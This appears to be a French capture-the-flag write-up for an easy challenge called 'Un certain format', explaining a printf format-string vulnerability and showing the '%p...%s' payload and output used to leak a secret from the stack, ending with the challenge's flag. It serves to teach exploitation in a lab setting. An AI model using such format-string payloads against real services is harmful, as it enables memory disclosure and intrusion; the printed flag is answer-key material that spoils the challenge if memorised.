# Un certain format

## Difficulté : facile

### Description :

Nous avons découvert un port caché sur les serveurs de la DSI. Lorsque nous leur en avons fait part, ils nous ont simplement répondu "Tant que vous respectez le format, tout va bien". Il semble bien que l'app cache un secret...

### Analyse

On comprend très bien qu'il faut trouver un moyen de lire le contenu de la variable `SECRET`. Seulement, il semble que l'on ne puisse que rentrer une chaîen qui sera ensuite affichée par printf.

Seulement, printf ne fait pas qu'*afficher* une chaîne. La fonction affiche une chaîne formattée, dont les arguments se trouvent sur la pile.
Ainsi "%p%p%s" affichera au format héxadécimal les deux premiers mots sur la pile, puis récupèrera la valeur suivant sur la pile, et ira chercher à l'adresse correspondante une chaîne de charactère.

Là où ça devient intéressant, c'est que les variables définies dans la fonction main sont stockée sur la pile. On peut donc lire la pile jusqu'à tomber sur notre variable SECRET.

### Exploitation

Pour cela, il suffit d'envoyer en paramètre des %x, %p ou autres et des %s quand on obtient une adresse.
Avec `%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p` on obtient la sortie
```
Hello 0x20-(nil)-0x400-0x400-0x7fd36340aae0-0x7fff61b71df8-0x200000000-0xffffffff00000000-0x402049-0xdeadbeef6343cab0-0x402020
```

On remarque le 0xdeadbeef et le flag devrait être situé juste après donc, ens dernière position. On modifie notre payload: `%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%s`

La sortie est alors
```
Hello 0x20-(nil)-0x400-0x400-0x7fa9f9a82ae0-0x7ffcc972e658-0x200000000-0xffffffff00000000-0x402049-0xdeadbeeff9ab4ab0-CTF101{5c1eb9a99fdfbc7d4d70599cacd15ba2}
```
### Solution

CTF101{5c1eb9a99fdfbc7d4d70599cacd15ba2}